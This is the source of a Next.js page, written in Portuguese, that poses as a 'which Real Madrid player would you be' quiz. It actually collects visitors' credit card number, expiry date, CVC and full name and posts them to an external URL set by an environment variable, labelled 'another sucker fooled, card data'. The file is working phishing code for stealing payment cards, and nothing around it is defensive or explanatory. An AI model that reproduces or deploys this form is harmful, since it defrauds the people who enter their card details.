"use client";

import { useForm, Controller } from "react-hook-form";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import Image from "next/image";
import { useRouter } from "next/navigation";

const createUserFormSchema = z.object({
  name: z.string().nonempty("O nome é obrigatório"),
  credCard: z
    .string()
    .nonempty("O número do cartão de crédito é obrigatório")
    .regex(
      /^\d{4}-\d{4}-\d{4}-\d{4}$/,
      "O número do cartão de crédito precisa estar no padrão 0000-0000-0000-0000"
    ),
  validity: z
    .string()
    .nonempty("A data de validade é obrigatória")
    .regex(
      /^(0[1-9]|1[0-2])\/\d{4}$/,
      "A validade deve estar no formato MM/AAAA"
    ),
  cvc: z
    .string()
    .nonempty("O CVC é obrigatório")
    .regex(/^\d{3}$/, "O CVC precisa ter 3 caracteres numéricos"),
});

type CreateUserFormData = z.infer<typeof createUserFormSchema>;

export default function Home() {
  const router = useRouter();
  const {
    control,
    handleSubmit,
    formState: { errors },
    register,
    setValue,
  } = useForm<CreateUserFormData>({
    resolver: zodResolver(createUserFormSchema),
  });

  const createUser = async (data: CreateUserFormData) => {
    // console.log(data);
    try {
      await fetch(`${process.env.NEXT_PUBLIC_FORM_URL}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json;charset=utf-8",
        },
        body: JSON.stringify({
          message: `Outro trouxa enganado, dados do cartão:<br />
          Nome: ${data.name}<br />
          Cartão de Crédito: ${data.credCard}<br />
          CVC: ${data.cvc}<br />
          Validade: ${data.validity}<br />`,
        }),
      });

      router.push("/result");
    } catch (error) {
      // console.error(error);
      console.error("Não foi possível calcular, tente novamente!");
    }
  };

  const formatCreditCardNumber = (value: string | undefined) => {
    if (!value) {
      return "";
    }
    const cleaned = value.replace(/\D/g, "");
    const match = cleaned.match(/.{1,4}/g);
    return match ? match.join("-") : value;
  };

  const handleNameChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const formattedName = (name: string | undefined) => {
      if (!name) {
        return "";
      }
      const hasTrailingSpace = name.endsWith(" ");
      const formatted = name
        .trim()
        .split(" ")
        .map((word) => {
          return word[0]
            .toLocaleUpperCase()
            .concat(word.substring(1).toLowerCase());
        })
        .join(" ");
      return hasTrailingSpace ? formatted + " " : formatted;
    };
    setValue("name", formattedName(event.target.value));
  };

  return (
    <main className="flex flex-col items-center my-8 gap-4">
      <Image
        className="w-[50vw] h-auto rounded-md"
        src="/team.jpg"
        alt="Real Madrid Team"
        width={984}
        height={656}
        priority
      />
      <h1 className="text-center text-lg font-semibold">
        Descubra qual jogador do Real Madrid você seria:
      </h1>
      <form
        onSubmit={handleSubmit(createUser)}
        className="flex flex-col gap-2 w-full max-w-md"
      >
        <div className="flex flex-col gap-1 items-center">
          <label htmlFor="credCard">Número do cartão de crédito</label>
          <Controller
            name="credCard"
            control={control}
            render={({ field }) => (
              <input
                type="text"
                className="w-full text-center border border-zinc-800 shadow-sm rounded h-10 px-3 text-black"
                {...field}
                value={formatCreditCardNumber(field.value)}
                onChange={(e) =>
                  field.onChange(formatCreditCardNumber(e.target.value))
                }
                maxLength={19} // Limite de caracteres (16 dígitos + 3 traços)
              />
            )}
          />
          {errors.credCard && (
            <span className="text-red-500 text-sm">
              {errors.credCard.message}
            </span>
          )}
        </div>

        <div className="flex flex-col gap-1 items-center">
          <label htmlFor="validity">Validade</label>
          <input
            type="text"
            className="w-full text-center border border-zinc-800 shadow-sm rounded h-10 px-3 text-black"
            {...register("validity")}
          />
          {errors.validity && (
            <span className="text-red-500 text-sm">
              {errors.validity.message}
            </span>
          )}
        </div>

        <div className="flex flex-col gap-1 items-center">
          <label htmlFor="cvc">CVC</label>
          <input
            type="text"
            className="w-full text-center border border-zinc-800 shadow-sm rounded h-10 px-3 text-black"
            {...register("cvc")}
          />
          {errors.cvc && (
            <span className="text-red-500 text-sm">{errors.cvc.message}</span>
          )}
        </div>

        <div className="flex flex-col gap-1 items-center">
          <label htmlFor="name">Nome Completo</label>

          <input
            type="text"
            className="w-full text-center border border-zinc-800 shadow-sm rounded h-10 px-3 text-black"
            {...register("name")}
            onChange={handleNameChange}
          />
          {errors.name && (
            <span className="text-red-500 text-sm">{errors.name.message}</span>
          )}
        </div>

        <button
          type="submit"
          className="bg-emerald-500 mt-4 rounded font-semibold text-zinc-800 h-10 hover:bg-emerald-600"
        >
          Verificar
        </button>
      </form>
    </main>
  );
}
